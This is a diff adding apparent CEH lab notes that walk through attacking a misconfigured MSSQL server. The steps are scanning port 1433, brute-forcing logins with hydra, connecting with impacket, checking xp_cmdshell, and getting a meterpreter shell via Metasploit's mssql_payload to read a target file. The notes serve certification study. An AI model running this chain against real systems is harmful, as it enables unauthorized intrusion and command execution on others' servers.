@@ -1085,8 +1085,27 @@ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py SKILL.CEH.COM/ -n
 john --show hash.txt  in case you need to check out put again
 
 
+A client machine under the target domain controller has a misconfigured SQL server vulnerability. , retrieve the MSS.txt file located in the Public Downloads folder on the client machine and determine its size in bytes as answer.
 
+nmap -p 1433 192.168.10.0/24 --open
+hydra -L username.txt -P password.txt 192.168.10.144 mssql
+hydra -L username.txt -P password.txt 192.168.10.144 mssql
 
+find ~ -name "username.txt"
+ls -l ~/username.txt
+
+user = Server_mssrv  and Password = Spidy
+ python3 /Ad-tools/impacket/examples/mssqlclient.py SKILL.com/Server_mssrv:Spidy@192.168.10.144  -port 1433
+python3 /root/impacket/examples/mssqlclient.py SKILL.com/Server_mssrv:Spidy@192.168.10.144  -port 1433
+Then type this [ SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell'; ]
+	type exit.
+	Goto msfconsole
+	 use exploit/windows/mssql/mssql_payload ▪ set RHOST 192.168.10.144 ▪ set USERNAME Server_mssrv ▪ set PASSWORD Spidy ▪ set DATABASE msdb
+show options
+	exploit
+	In meterpreter, type shell
+	type cd /Users/Public/Downloads/  and type dir
+	note the size of MSS.txt
 
 
 
